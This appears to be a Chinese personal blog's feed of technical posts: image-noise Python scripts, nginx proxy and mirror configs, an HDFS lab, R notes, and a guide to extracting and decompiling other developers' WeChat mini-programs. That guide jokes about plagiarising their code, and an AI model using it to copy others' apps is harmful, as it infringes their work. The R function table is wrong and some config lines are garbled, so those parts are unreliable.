      <title>图像加噪</title>
      <link href="/2020/04/04/%E5%9B%BE%E5%83%8F%E5%8A%A0%E5%99%AA/"/>
      <url>/2020/04/04/%E5%9B%BE%E5%83%8F%E5%8A%A0%E5%99%AA/</url>
      
        <content type="html"><![CDATA[<p>图像增加噪声（防止过拟合）</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在有些情况下，会因为研究需要所以用一些增加了噪声的图片</p><ul><li><p>文件目录树</p><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">│  GaussianNoise.py<span class="hljs-comment">#高斯噪声</span>│  SpicedSaltNoise.py<span class="hljs-comment">#盐椒噪声</span>│  ├─images <span class="hljs-comment">#将所有需要处理的所有图片该文件夹内</span>│      test.<span class="hljs-keyword">jpg</span><span class="hljs-comment">#原图</span>│      └─noise_img    ├─Gussian_noise_img<span class="hljs-comment">#存放加入高斯噪声图像的文件夹</span>    │      Gussian_noise_test.<span class="hljs-keyword">jpg </span>    │          └─salt-<span class="hljs-keyword">and-pepper_noise_img</span><span class="hljs-comment">#存放加入盐椒噪声图像的文件夹</span>            salt-<span class="hljs-keyword">and-pepper_noise_test.jpg</span></code></pre></div><p>​        </p></li></ul><h2 id="高斯噪声"><a href="#高斯噪声" class="headerlink" title="高斯噪声"></a>高斯噪声</h2><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 增加高斯噪声</span><span class="hljs-keyword">from</span> skimage <span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> matplotlib<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gauss_noise</span><span class="hljs-params">(image)</span>:</span>    img = image.astype(np.int16)  <span class="hljs-comment"># 此步是为了避免像素点小于0，大于255的情况</span>    mu = <span class="hljs-number">0</span>    sigma = <span class="hljs-number">10</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(img.shape[<span class="hljs-number">0</span>]):        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(img.shape[<span class="hljs-number">1</span>]):            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(img.shape[<span class="hljs-number">2</span>]):                img[i, j, k] = img[i, j, k] + random.gauss(mu=mu, sigma=sigma)    img[img &gt; <span class="hljs-number">255</span>] = <span class="hljs-number">255</span>    img[img &lt; <span class="hljs-number">0</span>] = <span class="hljs-number">0</span>    img = img.astype(np.uint8)    <span class="hljs-keyword">return</span> img<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    <span class="hljs-comment"># 读取images文件夹内的图片名称</span>    images_list = os.listdir(<span class="hljs-string">'images/'</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(images_list), <span class="hljs-number">1</span>):        img = io.imread(<span class="hljs-string">r"images/"</span>+images_list[i])        <span class="hljs-comment"># noise_img = salt_and_pepper_noise(img)</span>        gauss_img = gauss_noise(img)        <span class="hljs-comment"># io.imshow(gauss_img)</span>        <span class="hljs-comment"># io.show()</span>        <span class="hljs-keyword">if</span> (os.path.exists(<span class="hljs-string">'noise_img\\Gussian_noise_img'</span>) == <span class="hljs-literal">False</span>):            os.mkdir(<span class="hljs-string">"noise_img\\Gussian_noise_img"</span>)<span class="hljs-comment">#此步骤用于判断有无存放噪声图片的文件夹，没有则创建</span>        matplotlib.image.imsave(<span class="hljs-string">"noise_img/Gussian_noise_img/"</span>+<span class="hljs-string">"Gussian_noise_"</span> + images_list[i], gauss_img) <span class="hljs-comment">#numpy数组转换为图片保存</span></code></pre></div><h2 id="盐椒噪声"><a href="#盐椒噪声" class="headerlink" title="盐椒噪声"></a>盐椒噪声</h2><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#增加椒盐噪声</span><span class="hljs-keyword">from</span> skimage <span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> matplotlib<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">salt_and_pepper_noise</span><span class="hljs-params">(img, proportion=<span class="hljs-number">0.10</span>)</span>:</span>   <span class="hljs-comment">#此处数值设置椒盐噪声强度</span>    noise_img = img    height, width = noise_img.shape[<span class="hljs-number">0</span>], noise_img.shape[<span class="hljs-number">1</span>]    num = int(height * width * proportion)  <span class="hljs-comment"># 多少个像素点添加椒盐噪声</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(num):        w = random.randint(<span class="hljs-number">0</span>, width - <span class="hljs-number">1</span>)        h = random.randint(<span class="hljs-number">0</span>, height - <span class="hljs-number">1</span>)        <span class="hljs-keyword">if</span> random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>:            noise_img[h, w] = <span class="hljs-number">0</span>        <span class="hljs-keyword">else</span>:            noise_img[h, w] = <span class="hljs-number">255</span>    <span class="hljs-keyword">return</span> noise_img<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    images_list = os.listdir(<span class="hljs-string">'images/'</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(images_list), <span class="hljs-number">1</span>):        img = io.imread(<span class="hljs-string">r"images/"</span>+images_list[i])        noise_img = salt_and_pepper_noise(img)        <span class="hljs-comment"># io.imshow(noise_img)</span>        <span class="hljs-comment"># io.show()</span>        <span class="hljs-keyword">if</span> (os.path.exists(<span class="hljs-string">'noise_img\\salt-and-pepper_noise_img'</span>) == <span class="hljs-literal">False</span>):            os.mkdir(<span class="hljs-string">"noise_img\\salt-and-pepper_noise_img"</span>)<span class="hljs-comment">#此步骤用于判断有无存放噪声图片的文件夹，没有则创建</span>        matplotlib.image.imsave(<span class="hljs-string">"noise_img/salt-and-pepper_noise_img/"</span>+<span class="hljs-string">"salt-and-pepper_noise_"</span> + images_list[i], noise_img) <span class="hljs-comment">#numpy数组转换为图片保存</span></code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx反向代理</title>
      <link href="/2020/03/30/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
      <url>/2020/03/30/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>Nginx是个好东西</p><a id="more"></a><p>通过Nginx反向代理加速网站访问速度</p><p>ip示例：106.42.254.40</p><p>二级域名示例：oj.example.com</p><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-section">server</span> {     <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span>;     <span class="hljs-attribute">server_name</span> onj.example.com;         <span class="hljs-attribute">ssl</span> <span class="hljs-literal">on</span>;    <span class="hljs-attribute">ssl_certificate</span> /www/wwwroot/ssl/oj/oj.example.com.crt;    <span class="hljs-attribute">ssl_certificate_key</span> /www/wwwroot/ssl/oj/oj.example.com   ssl_certificate_key /etc/ssl/2_baofeidyz.com.key;        <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">5m</span>;        <span class="hljs-attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;        <span class="hljs-attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;        <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;            <span class="hljs-attribute">location</span> / {       <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;       <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$http_host</span>;       <span class="hljs-attribute">proxy_pass</span> http://106.42.154.40/;     } }</code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux/anoconda更换镜像</title>
      <link href="/2020/03/30/linux-anoconda%E6%9B%B4%E6%8D%A2%E9%95%9C%E5%83%8F/"/>
      <url>/2020/03/30/linux-anoconda%E6%9B%B4%E6%8D%A2%E9%95%9C%E5%83%8F/</url>
      
        <content type="html"><![CDATA[<p>这破网速受不了</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>国内使用linux/anaconda官方源很慢，所以一般都使用镜像源</p><p>（PS：镜像网站是指每隔一段时间就同步更新到与另外一个网站资源相同的网站）</p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="ubuntu-18-04LTS"><a href="#ubuntu-18-04LTS" class="headerlink" title="ubuntu 18.04LTS"></a>ubuntu 18.04LTS</h3><div class="hljs code-wrapper"><pre><code class="hljs vim"># 默认注释了源码镜像以提高 apt <span class="hljs-keyword">update</span> 速度，如有需要可自行取消注释<span class="hljs-keyword">deb</span> http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic main restricted universe multiverse# <span class="hljs-keyword">deb</span>-src http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic main restricted universe multiverse<span class="hljs-keyword">deb</span> http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic-updates main restricted universe multiverse# <span class="hljs-keyword">deb</span>-src http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic-updates main restricted universe multiverse<span class="hljs-keyword">deb</span> http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic-backports main restricted universe multiverse# <span class="hljs-keyword">deb</span>-src http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic-backports main restricted universe multiverse<span class="hljs-keyword">deb</span> http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic-security main restricted universe multiverse# <span class="hljs-keyword">deb</span>-src http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic-security main restricted universe multiverse# 预发布软件源，不建议启用# <span class="hljs-keyword">deb</span> http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic-proposed main restricted universe multiverse# <span class="hljs-keyword">deb</span>-src http<span class="hljs-variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/ubuntu/ bionic-proposed main restricted universe multiverse</code></pre></div><h3 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h3><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-comment"># CentOS-Base.repo</span><span class="hljs-comment">#</span><span class="hljs-comment"># The mirror system uses the connecting IP address of the client and the</span><span class="hljs-comment"># update status of each mirror to pick mirrors that are updated to and</span><span class="hljs-comment"># geographically close to the client.  You should use this for CentOS updates</span><span class="hljs-comment"># unless you are manually picking other mirrors.</span><span class="hljs-comment">#</span><span class="hljs-comment"># If the mirrorlist= does not work for you, as a fall back you can try the</span><span class="hljs-comment"># remarked out baseurl= line instead.</span><span class="hljs-comment">#</span><span class="hljs-comment">#</span><span class="hljs-section">[base]</span><span class="hljs-attr">name</span>=CentOS-<span class="hljs-variable">$releasever</span> - Base<span class="hljs-attr">baseurl</span>=https://mirrors.tuna.tsinghua.edu.cn/centos/<span class="hljs-variable">$releasever</span>/os/<span class="hljs-variable">$basearch</span>/<span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os</span><span class="hljs-attr">enabled</span>=<span class="hljs-number">1</span><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><span class="hljs-attr">gpgkey</span>=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-<span class="hljs-number">7</span><span class="hljs-comment">#released updates</span><span class="hljs-section">[updates]</span><span class="hljs-attr">name</span>=CentOS-<span class="hljs-variable">$releasever</span> - Updates<span class="hljs-attr">baseurl</span>=https://mirrors.tuna.tsinghua.edu.cn/centos/<span class="hljs-variable">$releasever</span>/updates/<span class="hljs-variable">$basearch</span>/<span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates</span><span class="hljs-attr">enabled</span>=<span class="hljs-number">1</span><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><span class="hljs-attr">gpgkey</span>=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-<span class="hljs-number">7</span><span class="hljs-comment">#additional packages that may be useful</span><span class="hljs-section">[extras]</span><span class="hljs-attr">name</span>=CentOS-<span class="hljs-variable">$releasever</span> - Extras<span class="hljs-attr">baseurl</span>=https://mirrors.tuna.tsinghua.edu.cn/centos/<span class="hljs-variable">$releasever</span>/extras/<span class="hljs-variable">$basearch</span>/<span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras</span><span class="hljs-attr">enabled</span>=<span class="hljs-number">1</span><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><span class="hljs-attr">gpgkey</span>=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-<span class="hljs-number">7</span><span class="hljs-comment">#additional packages that extend functionality of existing packages</span><span class="hljs-section">[centosplus]</span><span class="hljs-attr">name</span>=CentOS-<span class="hljs-variable">$releasever</span> - Plus<span class="hljs-attr">baseurl</span>=https://mirrors.tuna.tsinghua.edu.cn/centos/<span class="hljs-variable">$releasever</span>/centosplus/<span class="hljs-variable">$basearch</span>/<span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus</span><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><span class="hljs-attr">enabled</span>=<span class="hljs-number">0</span><span class="hljs-attr">gpgkey</span>=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-<span class="hljs-number">7</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> yum makecache<span class="hljs-comment">#更新软件包缓存</span></code></pre></div><h2 id="anaconda"><a href="#anaconda" class="headerlink" title="anaconda"></a>anaconda</h2><p>anaconda 添加清华镜像源:</p><p><code>pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p>【讲真，有时候清华镜像会挂掉，推荐用阿里镜像】</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">清华镜像 Ubuntu 镜像使用帮助</a></p><p><a href="https://mirror.tuna.tsinghua.edu.cn/help/centos/" target="_blank" rel="noopener">清华镜像 centos 镜像使用帮助</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序反编译</title>
      <link href="/2020/03/25/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
      <url>/2020/03/25/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<p>学习…</p><a id="more"></a><p>使用wxappUnpacker安装小程序反编译工具（2020.03）</p><p><strong>关键词:</strong> 小程序 wxss</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>上次分享了<a href="工具：web前端爬取">web前端爬取工具</a> ，那么这次也同样讲讲微信小程序反编译吧，对于像博主这种审美奇低且前端技术渣渣的人来说，实在是利器呀。不过尽量只是反编译来学习研究啦！</p><h2 id="安装反编译脚本"><a href="#安装反编译脚本" class="headerlink" title="安装反编译脚本"></a>安装反编译脚本</h2><p>首先，得先了解下怎么安装,内容过长，我就不Ctrl CV了(主要是安装简单，成功并且完美地编译难)</p><p>完美地反编译出来难就难在微信小程序一直更新，但是编译工具又是旧的</p><p>First,<a href="https://www.jianshu.com/p/97b7d5498dcd" target="_blank" rel="noopener">终于成功了，分享一波超详细小程序源码获取方法——图文!</a></p><p>如果想省事，安装nodejs之后直接下载下面的链接的文件替换掉你的反编译工具：</p><p><a href="https://gitee.com/Sao-operation/wxappUnpacker/repository/archive/master.zip" target="_blank" rel="noopener">https://gitee.com/Sao-operation/wxappUnpacker/repository/archive/master.zip</a></p><p>如果你只是样式编译出问题了（就是page的wxss都是空白的），那么</p><ul><li>修改wxappUnpacker文件中的 <code>wuWxss.js</code></li></ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">function</span> <span class="hljs-selector-tag">runVM</span>(<span class="hljs-selector-tag">name</span>, <span class="hljs-selector-tag">code</span>) {      // let wxAppCode = {}, handle = {cssFile: name};      // let vm = new VM({      //    sandbox: Object.assign(new GwxCfg(), {      //       __wxAppCode__: wxAppCode,      //       setCssToHead: cssRebuild.bind(handle)      //    })      // });      // vm.run(code);      // for (let name in wxAppCode) if (name.endsWith(".wxss")) {      //    handle.cssFile = path.resolve(frameName, "..", name);      //    wxAppCode[name]();      // }       let wxAppCode = {};      let handle = {cssFile: name};      let gg = new GwxCfg();      let tsandbox = {         $gwx: GwxCfg.prototype["$gwx"],         __mainPageFrameReady__: GwxCfg.prototype["$gwx"],   //解决 $gwx is not defined         __vd_version_info__: GwxCfg.prototype["$gwx"],  //解决 __vd_version_info__ is not defined         __<span class="hljs-selector-tag">wxAppCode__</span>: <span class="hljs-selector-tag">wxAppCode</span>,         <span class="hljs-selector-tag">setCssToHead</span>: <span class="hljs-selector-tag">cssRebuild</span><span class="hljs-selector-class">.bind</span>(<span class="hljs-selector-tag">handle</span>)      }       let vm = new VM({sandbox: tsandbox});      <span class="hljs-selector-tag">vm</span><span class="hljs-selector-class">.run</span>(<span class="hljs-selector-tag">code</span>);      <span class="hljs-selector-tag">for</span> (<span class="hljs-selector-tag">let</span> <span class="hljs-selector-tag">name</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">wxAppCode</span>) {         if (name.endsWith(".wxss")) {            handle.cssFile = path.resolve(frameName, "..", name);            <span class="hljs-selector-tag">wxAppCode</span><span class="hljs-selector-attr">[name]</span>();         }      }   }</code></pre></div><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="获取wxapkg文件"><a href="#获取wxapkg文件" class="headerlink" title="获取wxapkg文件"></a>获取wxapkg文件</h3><ol><li><p>安装夜深模拟器（但是这里有个问题，夜深模拟器可能用不了，我只记得是多开器里开一个新的才行，而且以后每次使用都得切换成那个新的）</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/FrontEnd/e09793ce1f6c1e1b7df8ee715ffe644.png" srcset="/img/loading.gif" lazyload="" width="50%"></center></li><li><p>打开夜深模拟器登录微信，点击需要学(piao)习(qie)的微信小程序</p></li></ol><ol start="3"><li><p>打开RE文件管理器（没有的话就先安装吧）,到如下目录,打开这个看着名字是十六进制且很长的文件夹（每个人的会不一样）</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/FrontEnd/ee216cc30578465e21856c8e9129287.png" srcset="/img/loading.gif" lazyload="" width="50%"></center></li><li><p>进入如下目录，选择wxapkg文件（注意日期，例如红线部分意为6月17日）</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/FrontEnd/915a490aff677433a5788b2c0eca4ef.png" srcset="/img/loading.gif" lazyload="" width="100%"></center></li><li><p>想办法把wxapkg文件从夜深模拟器里发送到你的能找到到电脑文件夹里吧</p></li></ol><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><ol><li><p>打开nodejs</p><p> <img src="https://upload-images.jianshu.io/upload_images/19330433-85c7fe8788ed7a1f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/338/format/webp" srcset="/img/loading.gif" lazyload="" alt="img"></p><p> 跳转到反编译脚本的目录，例如反编译脚本呢放在D盘，且反编译脚本文件夹名为”wxappUnpacker“，如果是Windows系统( 如果是Linux去掉下面那个蛋疼的 /d)，则在node.js command pormpt输入：</p><div class="hljs code-wrapper"><pre><code class="hljs shell">cd/d D:\wxappUnpacker</code></pre></div><p>或</p><div class="hljs code-wrapper"><pre><code class="hljs shell">cd D:\wxappUnpackercd D:</code></pre></div></li><li><p>跳转到反编译脚本的根目录之后，在电脑文件夹里找到wxapkg文件，例如wxapkg文件放在D盘，且文件名为_000000_1.wxapkg，则在node.js command pormpt输入：</p><div class="hljs code-wrapper"><pre><code class="hljs shell">node wuWxapkg.js -d D:\_000000_1.wxapkg</code></pre></div><p>再回车</p></li><li><p>最后去找和.wxapkg文件相同路径下的同名文件夹，该文件用<strong>微信开发者工具</strong>打开即可。</p></li></ol><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>反编译…真香（我这是馋他的代码吗，我这是在学习研究）</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/97b7d5498dcd" target="_blank" rel="noopener">终于成功了，分享一波超详细小程序源码获取方法——图文：顺毛驴_dedc</a></p><p><a href="https://blog.csdn.net/weixin_34342992/article/details/91383119" target="_blank" rel="noopener">反编译微信小程序错误: $gwx is not defined和<strong>vd_version_info</strong> is not defined 已解决</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDFS基本命令</title>
      <link href="/2020/03/21/HDFS%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/03/21/HDFS%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>HDFS课程实验</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文为Hadoop基础实验中的HDFS基础命令实验</p><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>掌握Linux基本命令和HDFS基本命令。</p><p>掌握Java程序编写，编译，运行的基本方法。</p><h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><p>1、Linux基本命令和HDFS基本命令完成以下操作：（30分）</p><p>（1）在Linux根目录下创建一个名为a的文件夹，</p><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-built_in">mkdir</span> a</code></pre></div><p>（2）用vim命令在文件夹a中创建一个文件b.txt，文件内容是“Hello world”，</p><div class="hljs code-wrapper"><pre><code class="hljs stylus">cd mkdirtouch <span class="hljs-selector-tag">b</span>.txtecho <span class="hljs-string">"Hello world"</span> &gt; <span class="hljs-selector-tag">b</span>.txt</code></pre></div><p>（3）在HDFS根目录下创建一个名为test的文件夹，</p><div class="hljs code-wrapper"><pre><code class="hljs dos">hadoop <span class="hljs-built_in">fs</span> -<span class="hljs-built_in">mkdir</span> test</code></pre></div><p>（4）将b.txt上传到test文件夹中。</p><div class="hljs code-wrapper"><pre><code class="hljs applescript">hdfs dfs -<span class="hljs-keyword">put</span> ~/b.txt</code></pre></div><p>2、在eclipse环境下调试下列程序，在HDFS上创建/test/aw1.txt，并写入”hello”</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.hadoop.conf.Configuration;<span class="hljs-keyword">import</span> org.apache.hadoop.fs.FSDataInputStream;<span class="hljs-keyword">import</span> org.apache.hadoop.fs.FSDataOutputStream;<span class="hljs-keyword">import</span> org.apache.hadoop.fs.Path;<span class="hljs-keyword">import</span> org.apache.hadoop.fs.FileSystem; <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WordCount</span> </span>{  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{   Configuration conf=<span class="hljs-keyword">new</span> Configuration();    conf.set(<span class="hljs-string">"fs.defaultFS"</span>,<span class="hljs-string">"hdfs://Cent12:9000/"</span>);     FileSystem fs=FileSystem.get(conf);     Path path = <span class="hljs-keyword">new</span> Path(<span class="hljs-string">"/test/aw1.txt"</span>);     FSDataOutputStream fos = fs.create(path);             fos.writeBytes(<span class="hljs-string">"hello"</span>);  } }</code></pre></div><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记：R语言</title>
      <link href="/2020/03/21/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9AR%E8%AF%AD%E8%A8%80/"/>
      <url>/2020/03/21/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9AR%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<p>学习北大李东风老师的R语言教程的笔记记录（断更）</p><a id="more"></a><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ul><li>四则运算</li></ul><table><thead><tr><th align="center">加</th><th align="center">减</th><th align="center">乘</th><th align="center">除</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">-</td><td align="center">*</td><td align="center">/</td></tr></tbody></table><p>eg：<code>(1+5)-2*7/3</code></p><p>注意括号要用英文的</p><p>向量</p><div class="hljs code-wrapper"><pre><code class="hljs r">x1 &lt;- <span class="hljs-number">1</span>:<span class="hljs-number">10</span>   <span class="hljs-comment">#生成1到5，步长为1的数组并赋值给x</span></code></pre></div><ul><li>数学函数</li></ul><table><thead><tr><th align="center">平方根</th><th align="center">指数</th><th align="center">对数</th></tr></thead><tbody><tr><td align="center">sqrt( )</td><td align="center">exp( )</td><td align="center">log( )</td></tr></tbody></table><div class="hljs code-wrapper"><pre><code class="hljs r">sqrt(<span class="hljs-number">6.25</span>)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs r">x &lt;- <span class="hljs-number">1</span>exp(x)</code></pre></div><table><thead><tr><th align="center">向下取整</th><th align="center">四舍五入取整</th><th align="center">向上取整</th></tr></thead><tbody><tr><td align="center">round( )</td><td align="center">floor( )</td><td align="center">ceiling( )</td></tr></tbody></table><div class="hljs code-wrapper"><pre><code class="hljs r">round(<span class="hljs-number">1.1234</span>, <span class="hljs-number">2</span>)  <span class="hljs-comment">#1.1234向下取整保留两位</span></code></pre></div><table><thead><tr><th align="center">正弦</th><th align="center">余弦</th><th align="center">正切</th><th align="center">圆周率</th></tr></thead><tbody><tr><td align="center">round( )</td><td align="center">floor( )</td><td align="center">ceiling( )</td><td 